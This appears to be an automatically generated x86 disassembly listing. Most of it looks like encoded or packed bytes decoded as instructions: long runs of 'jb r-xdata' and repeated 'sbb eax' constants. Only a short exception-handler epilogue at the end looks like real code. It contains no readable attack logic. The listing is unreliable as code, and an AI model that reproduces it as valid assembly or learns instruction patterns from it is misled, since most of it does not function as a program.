sbb eax 0x7a64ed72
xor ecx [ ebx ]
pop ebx
pop eax

sbb eax 0x72727221
jb r-xdata
jb r-xdata
and eax [ ebx + ebp * 2 - 0x7745c559 ]
jb r-xdata
sbb eax 0xeab41d72
jb r-xdata
push cs
sbb eax 0x6372721d
xchg [ edx ] ebx
loop r-xdata
or dh [ eax ]
push edx
sbb eax 0xf2a7691d
popad
sbb eax 0x7272721d
jb r-xdata
out dx al
or esp [ esi + 0x55 ]
xchg esp eax
mov dl 0xb
push esi
mov dl 0x1d
cmpsd [ esi ] [ edi ]
mov dl 0x1d
rcl [ ebx + 0x1d ] 0x1
sbb eax 0x6fee2661
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x707745c6 ] 0x69
jb r-xdata
push ebp
retn 0x94aa
cmpsd [ esi ] [ edi ]
cmp cl [ ebp + 0x25848d91 ]
cmpsd [ esi ] [ edi ]
xchg esi eax
retn 0x94aa
sbb cl [ edx ]
jb r-xdata
jb r-xdata
and eax 0x90922aa7
jb r-xdata
jb r-xdata
pop esi
sbb eax 0x2eb60b1d
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
mov edx 0x25b48c87
jb r-xdata
test [ ebx ] ebp
jb r-xdata
jb r-xdata
jb r-xdata
call 0xffffffff88b8b9e0
mov [ edi - 0x24f4cd97 ] cl
jb r-xdata
0xe2e72a0b 0x72e2
in eax dx
mov ch 0xb5
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2e8db0b
jb r-xdata
sbb eax 0xd2b41db2
outsd
sub bl [ bx ]
sbb eax 0x3e1a0b1d
sbb eax 0x7272721d
shr [ ebx ] 0x1
and ch ch
jpo r-xdata
cwde
push edx
sbb eax 0x676fb11d
dec esi
mov ch 0xb
jb r-xdata
and eax 0xafaf3aa7
mov edx 0x3ea72587
jb r-xdata
cli
jb r-xdata
loopne r-xdata
jb r-xdata
loop r-xdata
mov [ ebp + 0x3ca76b84 ] cl
jb r-xdata
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
or eax eax
dec ebp
sbb eax 0xa725721d
or dh [ edi + ebp * 4 - 0x58da4b57 ]
push cs
scasd [ edi ]
test eax 0xa725afb4
mov edx 0x25b48c87
out dx eax
xor [ 0x7272721d ] bl
jb r-xdata
cmp ch [ edi + 0x2587baaf ]
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
xchg esi eax
mov [ bx ] ss
or dl [ eax + 0x22671d1d ]
in eax dx
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x971db21d
or [ ebx - 0x114896e3 ] 0xa
add ebp [ 0x1db21d1d ]
xchg edi eax
dec [ ebx ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
loop r-xdata
jb r-xdata
or esi [ ecx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x6f72721d
sbb eax 0xb06a76f
dec edi
pop ss
test [ ebx - 0x61 ] ch
push cs
mov eax 0xdab76b84
imul ebx [ ebx + ecx ] 0x1d1d0c87
jb r-xdata
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
loop r-xdata
mov esp 0x7272212b
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or [ 0x7272721d ] ebx
jb r-xdata
or ebp [ esi + 0x721d1d24 ]
jb r-xdata
0xaf6b84 0x890a
jb r-xdata
popad
in al 0xed
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
xor [ eax ] ebp
jb r-xdata
jb r-xdata
insd
sbb eax 0xe2e22e55
jb r-xdata
jb r-xdata
imul esp [ edx + 0x1e87619a ] 0x6923e1e2
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edi [ edi + ecx * 2 ]
jb r-xdata
loop r-xdata
sub ebp ebp
sbb eax 0xeead69bb
rcr [ 0xffffffffe188b5b5 ] 0x1
or eax [ eax + 0x721d1d39 ]
jb r-xdata
sbb eax 0xbb5fab5
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ecx + 0x721d1d2e ]
jb r-xdata
imul ebx [ esi - 0x6124313a ] 0xffffffc6
aas
sbb eax 0xed727272
jb r-xdata
jb r-xdata
mov ch 0xb
mov [ 0x611d1d57 ] eax
jb r-xdata
push cs
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
and al 0x1d
jb r-xdata
imul ebp [ edi + 0x24890a00 ] 0x1d
sbb eax 0xed2267bb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
add bh [ ebx - 0x4df55891 ]
imul esp [ edi - 0x50947b16 ] 0x24890a00
sbb eax 0x2267bb1d
sbb eax 0xee0bceb5
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x2bbc7272
and [ edx + 0x72 ] esi
jb r-xdata
sbb eax 0x676fea97
jb r-xdata
0xe21e8761 0x23e1
jb r-xdata
jb r-xdata
dec edi
jb r-xdata
mov cl 0xa5
jb r-xdata
loop r-xdata
cmp [ 0x55ed721d ] ebx
jb r-xdata
sbb eax 0xf150b1d
dec ebp
jb r-xdata
jb r-xdata
cli
imul esp [ edx + edi * 4 + 0x1d27b10a ] 0x1d
mov ch [ 0xffffffffb50cda09 ]
imul esp [ esi + edi * 4 + 0x1d27a70a ] 0x1d
mov ch [ edi ]
xchg esi eax
and al 0xb5
imul esp [ esi + ebp * 2 - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov dh 0x52
popad
sbb ah bl
sub esp [ ecx ]
sbb ah bl
jb r-xdata
sbb eax 0xe31a611d
in al 0xe3
loop r-xdata
mov edi 0xea60a0e
sbb eax 0xee26611d
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
add [ edx ] cl
mov [ ebx + 0x2267bb1d ] esp
jb r-xdata
pop ss
jb r-xdata
adc bl [ 0x7272721d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x1e0a676f 0x1d1d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
xor [ ecx ] ebx
popad
and al 0xea
mov al [ 0x41f7be6a ]
or edx [ esp + ebx * 2 ]
sbb eax 0x7272721d
jb r-xdata
mov ah 0xda
imul edi [ edx ] 0x1d285f0b
sbb eax 0x72727272
jb r-xdata
imul esp [ 0xfffffffff6a76b84 ] 0x1d1b370b
sbb eax 0x72727272
jb r-xdata
loop r-xdata
sbb eax 0xd055ed72
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or al [ ebx - 0x1ee2e2c9 ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x16bf6b02
test cl bl
movsb [ edi ] [ esi ]
cmpsd [ esi ] [ edi ]
0x7272212b 0x7272
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov [ 0x13c20bee ] al
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbc0bea97
pop ss
sbb eax 0x7272721d
in eax dx
jb r-xdata
sbb eax 0x69caac69
mov edi 0x6930bee
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0x74d0b1d
aas
jb r-xdata
jb r-xdata
popad
jb r-xdata
imul ebp [ edi - 0x589044fe ] 0xa
mov dl 0x69
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbf6b0697
jb r-xdata
sbb eax 0x72727272
and [ 0x7272721d ] ebx
xor [ edi ] 0x1d
push ds
jb r-xdata
in eax dx
call sub_45bcd8
loop r-xdata
or dh bl
sub bl [ 0x2267bb1d ]
and ch ch
loop r-xdata
jb r-xdata
jb r-xdata
adc bl [ ebx + 0x1d ]
sbb eax 0x72727272
jb r-xdata
mov ch 0x88
jecxz r-xdata
sbb eax 0xe188b5b5
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0x6b
push 0x52
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
or edx [ ebx + 0x721d1d06 ]
jb r-xdata
push ss
aaa
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
loop r-xdata
or cl [ ebp + 0x52 ]
jb r-xdata
sbb eax 0xb22e11d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
les ecx [ ebp + 0x1d ]
lea bx [ edi ]
aas
jb r-xdata
sbb eax 0x89f0bcf
sbb eax 0xd2a66f1d
sbb eax 0xb2f6971d
sbb eax 0xe2e20e75
jb r-xdata
je r-xdata
jb r-xdata
jb r-xdata
stc
loope r-xdata
imul edi [ edi + 0x69818818 ] 0x38
or ebp [ ebx ]
push ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x22d1721d
push es
jb r-xdata
sbb eax 0x160b22e1
jb r-xdata
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
or edi edi
jb r-xdata
xchg edi eax
add bl [ 0xffffffffe2e26675 ]
loop r-xdata
sbb eax 0xed22671d
or ecx [ ebp + 0x7 ]
jb r-xdata
push edx
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg cx ax
adc ebx [ 0xa7e0b1d ]
sbb eax 0x7272721d
jb r-xdata
sbb [ 0xffffffffa76f721d ] bl
sbb eax 0x900bb294
jb r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
sbb eax 0x1d074d0b
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
imul ebp [ ebx + 0x16afe11a ] 0x1d244b0b
sbb eax 0xb727272
xchg ebx eax
out 0xe2 al
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul edi [ esi - 0x267b162e ] 0x33
or ebx [ ebx + 0x58 ]
sbb eax 0xcaac691d
and ch [ ebx ]
jb r-xdata
test [ ebx - 0x49 ] ch
cmp cl [ ebx ]
dec esi
sbb eax 0x7272721d
or ebx [ ebx ]
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
sbb eax 0x2b22d172
jb r-xdata
and cl [ ebx ]
jb r-xdata
loope r-xdata
jb r-xdata
sbb eax 0x72727272
test [ ebx - 0x49 ] ch
cmp [ eax + 0x6b849288 ] bh
push esp
loop r-xdata
push ss
mov dl 0xb
imul ebp [ edx ] 0x1d
sbb eax 0x72727272
or edx [ eax + 0x721d1d18 ]
outsd
jb r-xdata
jb r-xdata
pop ss
jb r-xdata
jb r-xdata
sbb eax 0x751d0297
pop es
jb r-xdata
jb r-xdata
imul esp [ 0x7221bfbd ] 0x72727272
jb r-xdata
jb r-xdata
imul ebp [ edx ] 0x1d1cbf0b
sbb eax 0x72727272
jb r-xdata
mov [ esp + eax * 4 - 0x47434895 ] cl
mov [ esi + 0x1d0a380b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
dec ebp
jb r-xdata
push edi
or [ 0x7272721d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
sbb ah cl
jb r-xdata
add [ 0xffffffff8c66ed1d ] ebx
imul ebp [ edi + 0x364d0b2e ] 0x1d
sbb eax 0x72727272
mov [ 0x1d2f690b ] al
sbb eax 0x72727272
sbb eax 0x1d0a7272
daa
sbb eax 0x22d1bb1d
imul esi [ edi - 0x6d7747c8 ] 0xffffff84
imul esi [ edi + 0x510bb83e ] 0x4e
sbb eax 0x7272721d
jb r-xdata
dec esi
jb r-xdata
push esi
sbb eax 0xa72721d
jb r-xdata
out dx al
xor al 0x3b
sbb eax 0xe024611d
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
sbb eax 0x1d0bb11d
or edx [ esi ]
jb r-xdata
mov bh 0x3e
mov eax 0x1d4e510b
mov eax 0x6b849288
scasb [ di ]
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
loopne r-xdata
jb r-xdata
imul esp [ edi + 0x2eafe136 ] 0x526a6bb2
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or edx [ 0x721d1d0f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ch [ edi + edx * 2 ]
jb r-xdata
scasd [ edi ]
jb r-xdata
jb r-xdata
nop
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx esp
popad
mov ebx 0xb2267bb
in eax dx
jb r-xdata
popad
xor bl [ 0x7272721d ]
jb r-xdata
inc edx
stosb [ edi ]
0xa20b2569 0x1d50
test [ ebx - 0x51 ] ch
or ecx [ cs : ebp + 0x36 ]
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov eax 0x1d4e510b
loop r-xdata
out dx al
sbb al 0xb
dec edi
add [ 0x7272721d ] bl
jb r-xdata
or edx [ eax ]
push es
and [ bp + 0x1d ] eax
sbb eax 0x1d23fa0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
cmp [ edi - 0x59 ] ebp
imul esp [ 0x1d50a20b ] 0x7272721d
jb r-xdata
jb r-xdata
aam 0x3e
jb r-xdata
loope r-xdata
fstp [ edi + 0x6930bee ]
out dx eax
and ch ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
loop r-xdata
jb r-xdata
nop [ 0x72727272 ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov bl 0xb
xlat
call 0xffffffffdc5199cd
xor al 0x1d
jb r-xdata
or ebp esi
mov ch 0xce
or cl [ ecx - 0x44e2e2dc ]
and ch ch
imul edi [ edi + 0x16bf6b02 ] 0xffffff84
fldenv [ esp + 0x17fa61ed ]
jb r-xdata
sbb eax 0xa76f721d
in eax dx
bound esi [ ecx + 0x1d25cb0b ]
sbb eax 0x4acb66ed
sbb eax 0x5aaf6f1d
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh ah
cmp [ 0xffffffffed22671d ] bl
hlt
sar [ ecx ] 0x1
outsd
cmpsd [ esi ] [ edi ]
and ch ch
jb r-xdata
or esi [ ecx + ecx ]
jb r-xdata
or ecx [ ebx + 0x24 ]
sbb eax 0x7272721d
or edx [ ebx + 0x72e2e2e6 ]
imul edi [ 0x24611931 ] 0xbe6aa0ea
test [ ecx + 0xb ] 0x1d1d5c14
jb r-xdata
cmp ebx [ 0xffffffffe024611d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jno r-xdata
jb r-xdata
pop edx
sbb eax 0x4c710a1d
jb r-xdata
jb r-xdata
mov [ ecx + 0x6b843b69 ] dl
imul edi [ eax ] 0x42bf6b84
jb r-xdata
sbb eax 0xbe02461
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub ebx [ eax + 0x1d ]
sbb eax 0x66ed2267
cli
loop r-xdata
jb r-xdata
in eax dx
jb r-xdata
or ecx [ edx + 0x33 ]
sbb eax 0x7272721d
jb r-xdata
fcmovnbe st6
jb r-xdata
inc eax
imul edi [ eax ] 0x46bf6b84
mov ecx 0x6b849688
imul ebp [ edx + 0xb2569ea ] 0x1d1d50a2
jb r-xdata
sbb eax 0x7272721d
pop ds
sbb eax 0x17ff0b1d
cli
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2bbbbb1d
and [ edx + 0x72 ] esi
sub al 0x57
jpe r-xdata
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x54ae2c2 ] 0xffffffb5
xchg edi eax
sbb eax 0x6971d72
mov edx 0x1d34dc0b
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
mov ah dl
0x4a0be2e2 0x1d3b
or [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov eax eax
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xed1aa7db
outsb
jo r-xdata
sbb eax 0xed22671d
jb r-xdata
cmp ebx [ bx + si + 0x1d ]
sbb eax 0x722122d1
jb r-xdata
loop r-xdata
sbb eax 0x1d4c710a
sbb eax 0x67ed2267
out dx eax
das
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb1d1d27
shl [ edx ] 0x1
loop r-xdata
sbb eax 0xed22671d
and al 0xe0
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
scasb [ edi ]
mov dl ah
sbb eax 0xe2e24e74
loop r-xdata
sbb eax 0x7272721d
cmpsd [ esi ] [ edi ]
sbb dh [ edx + 0xc0a2469 ]
pop ebp
sbb eax 0x2267bb1d
jb r-xdata
loopne r-xdata
xchg edx eax
sbb eax 0x8590b1d
sbb eax 0x2267721d
or esp edx
add [ 0xffffffffee0ab51d ] ebx
and ebx [ 0x67bbbb1d ]
and cl [ ebx ]
sbb eax 0x1d35170b
sbb [ ecx + 0x1d ] ecx
mov dl al
in eax dx
mov edi 0x9188b944
test [ ebx - 0x41 ] ch
dec edx
mov ecx 0x48bf6b84
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub al 0x1d
sbb eax 0x8a727272
fsubp st0
sar [ edx + 0x1d34dc0b ] 0x1d
or edx edi
jb r-xdata
sub cl [ ebx ]
sub eax 0x2a691d1d
or edi [ edi + 0x721d1d1c ]
adc [ ecx ] eax
sbb eax 0x8c66ed1d
jb r-xdata
out dx al
loopne r-xdata
mov edi 0x84386940
imul edi [ edi - 0x697746ba ] 0xffffff84
imul edi [ edi - 0x6e7746bc ] 0xffffff84
imul edi [ edi + 0x6b84b94a ] 0xffffffbf
dec eax
jb r-xdata
push es
fdiv [ ebx - 0x68e28de3 ]
jb r-xdata
jb r-xdata
out dx eax
jb r-xdata
sbb eax 0x8a727272
jb r-xdata
jb r-xdata
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e579
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push rw-data
